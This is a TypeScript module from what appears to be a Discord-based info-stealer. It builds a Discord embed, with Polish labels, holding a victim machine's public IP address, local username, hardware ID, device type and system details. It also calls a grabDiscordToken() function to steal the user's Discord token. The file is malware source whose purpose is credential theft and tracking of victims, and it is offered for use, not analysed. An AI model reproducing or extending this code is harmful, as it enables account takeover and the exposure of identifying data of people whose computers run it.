import { EmbedBuilder, Client } from 'discord.js'
import { getRandomColor } from '@/bot/functions/visual-embed/colors'
import { getFormattedTime } from '@/bot/functions/visual-embed/date'
import { getSystemInfo } from '@/bot/functions/system/check-system'
import { getLocalUsername } from '@/bot/functions/system/check-user'
import { getPublicIP } from '@/bot/functions/user-and-ip/ip'
import { getDeviceType } from '@/bot/functions/system/device'
import { getHWID } from '@/bot/functions/system/hwid'
import { grabDiscordToken } from '@/bot/functions/user-and-ip/grab-token'

export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
  const publicIp = await getPublicIP()
  const localUser = getLocalUsername()
  const hwid = await getHWID()
  const time = getFormattedTime()
  const device = getDeviceType()
  const system = getSystemInfo()
  grabDiscordToken()

  const embed = new EmbedBuilder()
    .setTitle('📝 **Temporary Logs** 📝')
    .setColor(getRandomColor())
    .setThumbnail(client.user?.displayAvatarURL() || '')
    .addFields(
      { name: '⏰ **Data**', value: time, inline: true },
      { name: '💻 **Urządzenie**', value: device, inline: true },
      { name: '⚙️ **System**', value: system, inline: true },
      { name: '🌐 **IPv4**', value: publicIp, inline: true },
      { name: '👤 **Użytkownik**', value: localUser, inline: true },
      { name: '🆔 **HWID**', value: hwid, inline: true }
    )
  return embed
}
